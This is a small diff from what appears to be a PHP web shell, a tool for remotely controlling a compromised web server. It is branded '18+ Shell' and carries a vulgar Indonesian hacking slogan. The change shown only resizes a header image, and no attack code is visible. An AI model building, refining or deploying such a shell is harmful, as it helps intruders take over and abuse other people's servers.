@@ -390,7 +390,7 @@ $lokasi = str_replace("\\", "/", $lokasi);
     <div class="atas">
         <div class="img coll">
             <span style='font-size: calc(25px + 1vw); font-weight: 700;'><?= $sname ?></span>
-            <img src="https://b.top4top.io/p_3195hgp2q1.gif" style="width: 20vh; transform: rotate(-90deg);" alt="18+ Shell">
+            <img src="https://b.top4top.io/p_3195hgp2q1.gif" style="width: 100px; transform: rotate(-90deg);" alt="18+ Shell">
             <p>Ngehack Sambil Coli Kawan!</p>
         </div>
         <hr style="margin: 1em;">
